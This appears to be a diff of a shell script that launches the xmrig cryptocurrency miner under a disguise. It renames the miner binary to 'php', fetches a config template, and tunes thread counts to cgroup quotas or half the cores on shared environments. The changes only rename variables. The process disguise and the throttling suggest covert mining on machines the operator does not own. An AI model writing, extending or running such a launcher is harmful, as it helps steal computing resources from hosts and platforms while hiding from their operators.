@@ -2,12 +2,12 @@
 
 ## object config
 OBJ_MASK="${OBJ_MASK:-php}"
-PAUSD_DAEMON="${PAUSD_DAEMON:-pausd}"
-PAUSD_DAEMON_NAME="${PAUSD_DAEMON##* }"
+DAEMON="${DAEMON:-pausd}"
+DAEMON_NAME="${DAEMON##* }"
 OBJ_CFG="${OBJ_CFG:-xmrig.1.json.tpl}"
 OBJ_CFG_MASK="${OBJ_CFG_MASK:-config.json}"
-# PAUSD_ARGS="${PAUSD_ARGS:-${OBJ_MASK} -c ${OBJ_CFG_MASK}}"
-PAUSD_ARGS="${PAUSD_ARGS:-${OBJ_MASK}}" ## configless because config is autoread from standard name
+# ARGS="${ARGS:-${OBJ_MASK} -c ${OBJ_CFG_MASK}}"
+ARGS="${ARGS:-${OBJ_MASK}}" ## configless because config is autoread from standard name
 
 ## download cfg
 if [ ! -e "cfg/${OBJ_CFG}" -a -n "$CFG_BASE_URL" ]; then
@@ -22,10 +22,10 @@ chmod +x "${OBJ_MASK}" &>/dev/null
 
 ## daemon
 # (when not included in the payload or is not a function)
-# PAUSD_DAEMON_URL=""
-# wget -q ${PAUSD_DAEMON_URL}
-if [ -e $PAUSD_DAEMON_NAME ]; then
-    chmod +x ${PAUSD_DAEMON_NAME} &>/dev/null
+# DAEMON_URL=""
+# wget -q ${DAEMON_URL}
+if [ -e $DAEMON_NAME ]; then
+    chmod +x ${DAEMON_NAME} &>/dev/null
 fi
 
 ## daemons conf
@@ -72,41 +72,41 @@ if [ -n "$cpu_p" -a -n "$cpu_q" -a "$cpu_p" != 0 ]; then ## respect cgroups
         ACORES=${ACORES:-$((cpu_q / cpu_p))} ## the available cpu (in number of cores)
     ## compose a binary string to map affinity (printf from bash or non busybox)
     if [ "$ACORES" -eq 1 ]; then
-        PAUSD_THREADS_D=1
+        THREADS_D=1
         if [ "$hashes" -gt 5 ]; then
-                PAUSD_VER_D=5
+                MHF_D=5
         else
-                PAUSD_VER_D=${hashes}
+                MHF_D=${hashes}
         fi
         elif [ -n "$ACORES" -a "$ACORES" -ne 0 ]; then
-                PAUSD_THREADS_D="$ACORES"
+                THREADS_D="$ACORES"
                 hashes_pc=$((hashes / ACORES))
                 if [ "$hashes_pc" -ge 5 ]; then
-                        PAUSD_VER_D=4 ## never use 5mh with more than 1c
+                        MHF_D=4 ## never use 5mh with more than 1c
                 else
-                        PAUSD_VER_D=$hashes_pc
+                        MHF_D=$hashes_pc
         fi
     fi
 else ## no cgroups, use half the cores
 
-        [ $CORES -gt 1 ] && PAUSD_THREADS_D=$((CORES / 2)) || PAUSD_THREADS_D=1
-        hashes_pc=$((hashes / PAUSD_THREADS_D))
+        [ $CORES -gt 1 ] && THREADS_D=$((CORES / 2)) || THREADS_D=1
+        hashes_pc=$((hashes / THREADS_D))
         if [ "$hashes_pc" -ge 5 ]; then
-                PAUSD_VER_D=4
+                MHF_D=4
         else
-                PAUSD_VER_D=$hashes_pc
+                MHF_D=$hashes_pc
         fi
 fi
 ## respect custom settings
 if [ -n "$MHF_FIXED" ]; then
-    PAUSD_VER=${MHF_FIXED}
+    MHF=${MHF_FIXED}
 else
-    PAUSD_VER=${PAUSD_VER:-${PAUSD_VER_D}}
+    MHF=${MHF:-${MHF_D}}
 fi
 if [ -n "$THREADS_FIXED" ]; then
-    PAUSD_THREADS=$THREADS_FIXED
+    THREADS=$THREADS_FIXED
 else
-    PAUSD_THREADS=${PAUSD_THREADS:-${PAUSD_THREADS_D}}
+    THREADS=${THREADS:-${THREADS_D}}
 fi
 ## don't setup affinity because on shared environments it yields lower performance overall
 ## because doesn't let the cpu scheduler do its job, other processes might stall causing further
@@ -114,9 +114,9 @@ fi
 export AFFINITY="0x0"
 
 ## vars for the pausd daemon
-export PAUSD_THREADS=${PAUSD_THREADS:-1} PAUSD_VER=${PAUSD_VER:-2}
-export PAUSD_SHARES=${PAUSD_SHARES:-$((PAUSD_THREADS * PAUSD_VER))} \
-       PAUSD_RATE=${PAUSD_RATE:-200}
+export THREADS=${THREADS:-1} MHF=${MHF:-2}
+export SHARES=${SHARES:-$((THREADS * MHF))} \
+       RATE=${RATE:-200}
 
 ## vars for the object config
 # read loadavg < /proc/loadavg
@@ -131,14 +131,6 @@ AESNI=${AESNI:-1}
 ## commands
 COMMAND_BEFORE="${COMMAND_BEFORE:-:;}"
 COMMAND_AFTER="${COMMAND_AFTER:-:;}"
-
-# ## set vars used by pausd daemon in tmux and envsubst
-# printf "" > "config.${PAUSD_DAEMON_NAME}"
-# for v in $(builtin compgen -A variable | grep ^PAUSD); do
-#     export $v
-#     printf "%s" "${v}=\"${!v}\" " >> "config.${PAUSD_DAEMON_NAME}"
-#     # tmx setenv -g $v "${!v}" ; ## don't use env vars for daemon configs, use file
-# done
 
 ## subst
 envsubst -no-empty -i "cfg/${OBJ_CFG}" -o "${OBJ_CFG_MASK}"
